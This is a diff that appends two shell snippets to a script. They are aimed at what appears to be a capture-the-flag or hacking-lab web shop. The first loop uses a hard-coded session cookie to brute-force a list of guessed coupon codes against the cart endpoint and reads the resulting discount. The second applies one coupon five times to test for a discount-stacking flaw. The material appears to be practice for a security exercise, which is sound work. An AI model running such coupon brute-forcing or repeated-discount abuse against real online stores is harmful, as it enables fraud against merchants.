@@ -106,3 +106,33 @@ if __name__ == "__main__":
 
 
 
+
+
+COOKIE='promarket_sesion=96aad09b5477f4b2a0dbb1b2c60648bb'
+BASE='https://chl-b1056da1-8c5a-4fb6-8ef1-36a12147b7d3-pro-market.b.softwareseguro.com.ar'
+for c in HACKLAB100 HACKLAB50 HACKLAB90 HACKLAB99 HACKLAB75 HACKLAB80 HACKLAB2026 HACKLAB10 FREE GRATIS SETUP SETUPDEFINITIVO ADMIN JUANCHO PREMIO BIENVENIDA WELCOME DESCUENTO100 OFF100 TOTAL; do
+  curl -s -b "$COOKIE" --data-urlencode "codigo=$c" "$BASE/carrito/cupon" >/dev/null
+  d=$(curl -s -b "$COOKIE" "$BASE/carrito" | grep -oiE "Descuento \([0-9]+%\)" | head -1)
+  echo "$c -> $d"
+done
+
+
+
+
+
+COOKIE='promarket_sesion=96aad09b5477f4b2a0dbb1b2c60648bb'
+BASE='https://chl-b1056da1-8c5a-4fb6-8ef1-36a12147b7d3-pro-market.b.softwareseguro.com.ar'
+for i in 1 2 3 4 5; do curl -s -b "$COOKIE" --data-urlencode "codigo=HACKLAB20" "$BASE/carrito/cupon" >/dev/null; done
+curl -s -b "$COOKIE" "$BASE/carrito" | grep -oiE "Descuento \([0-9]+%\)"
+
+
+
+
+
+
+
+
+
+
+
+
